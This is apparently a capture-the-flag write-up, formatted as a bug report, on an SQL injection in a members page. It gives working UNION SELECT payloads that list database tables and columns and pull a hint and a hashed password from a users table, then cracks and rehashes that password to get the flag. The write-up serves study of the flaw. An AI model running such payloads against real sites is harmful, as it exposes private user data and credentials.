# Bug Report - SQL Injection in Members

##  Bug description

An SQL Injection is a security breach that occurs when a web page has an input field of for example a user id or a username and the hacker inputs a SQL petition that runs without protection in the database, giving access to properties that should be private.

## How did I find it?

While looking for vulnerabilities, I tried giving thr input "1 OR 1=1" and when I got the result of all the info from all the users I knew there was a possible SQL injection there.

## Steps to replicate

1. First we are going to see all the columns of all the tables of the database:
	- 1 UNION SELECT 1,(SELECT GROUP_CONCAT(table_name,column_name) FROM information_schema.columns WHERE table_schema=database())

2. Then we can start checking field that where not accesible before, the first one interesting is Commentaire where we can see the next step to follow:
	- 1 UNION SELECT 1,Commentaire FROM users	--->	(Decrypt this password -> then lower all the char. Sh256 on it and it's good !)

3. Get the encrypted password from the countersign column:
	- 1 UNION SELECT 1,countersign FROM users

4. Decrypt the password using the MD5 algorithm, lowering all chars and applying SH256 on it to get the flag with this command:
	- echo -n fortytwo | sha256sum

https://owasp.org/www-community/attacks/SQL_Injection